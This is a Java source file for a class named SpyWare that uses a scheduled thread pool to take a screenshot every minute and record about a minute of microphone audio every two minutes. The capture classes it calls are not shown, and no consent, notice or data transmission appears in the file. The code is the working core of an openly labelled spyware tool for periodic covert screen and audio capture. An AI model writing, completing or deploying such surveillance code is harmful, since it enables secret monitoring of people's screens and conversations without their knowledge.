package spy;


import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

public class SpyWare {

    private static final long RECORD_TIME = 60000;

    private static ScheduledThreadPoolExecutor pool;

    public SpyWare() {
        pool = new ScheduledThreadPoolExecutor(2);
    }

    /**
     * Takes screenshot and record voice in a periodic time.
     */
    public void scheduledSpyWork() {
        startTakingScreenshot();
        startAndFinishRecordingAudio();
    }

    private void startTakingScreenshot() {
        Screenshot screenshot = new Screenshot();
        pool.scheduleWithFixedDelay(screenshot::captureScreen,
                0, 1, TimeUnit.MINUTES);
    }

    /**
     * Using scheduled thread pool we will keep starting the stopper timer
     * thread and start recording. Which will happen again and again after a
     * certain time period.
     */
    public static void startAndFinishRecordingAudio() {
        Runnable runnable = SpyWare::initStopperAndStartRecording;
        pool.scheduleWithFixedDelay(runnable, 0, 2, TimeUnit.MINUTES);
    }

    /**
     * Prepare and execute stopper thread which will work like a timer and
     * start recording immediately after that.
     */
    public static void initStopperAndStartRecording() {
        AudioRecorder audioRecorder = new AudioRecorder();
        stopperThread(audioRecorder);
        audioRecorder.startRecording();
    }

    /**
     * This method is responsible for creating a thread which will stop audio
     * line using Thread.sleep() method.
     *
     * @param audioRecorder audioRecorder
     */
    public static void stopperThread(AudioRecorder audioRecorder) {
        Thread t1 = new Thread(() -> stopAudioLine(audioRecorder));
        t1.start();
    }

    /**
     * We will use a thread to stop the recording. The thread will sleep for
     * some time and will stop the audio line after that.
     *
     * @param audioRecorder audioRecorder
     */
    public static void stopAudioLine(AudioRecorder audioRecorder) {
        try {
            Thread.sleep(RECORD_TIME);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        audioRecorder.finish();
    }
}